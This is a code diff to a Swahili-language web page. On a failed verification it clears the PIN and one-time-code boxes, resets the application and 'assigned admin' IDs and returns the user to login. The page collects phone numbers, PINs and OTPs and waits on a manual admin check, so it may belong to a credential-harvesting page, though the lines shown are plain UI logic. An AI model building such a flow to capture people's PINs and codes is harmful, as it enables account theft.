@@ -853,8 +853,26 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Tafadhali rudi na ujaribu tena.');
-          document.getElementById('bLogin').disabled = false;
+          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Unaelekezwa kwenye kuingia…');
+          setTimeout(() => {
+            // Reset OTP page state
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+            document.getElementById('bOtp').className = 'btn-otp';
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('otpInputSection').style.display = 'block';
+            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
+            hideOtpMsgs();
+            // Reset login page — clear PIN boxes, keep phone, re-enable button
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            document.getElementById('bLogin').disabled = false;
+            const phoneVal = document.getElementById('lgPh').value.trim();
+            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
+            hideLoginMsg();
+            S.applicationId = null;
+            S.assignedAdminId = null;
+            goTo('page-login');
+          }, 2500);
         }
       } catch (e) {
         // Silent
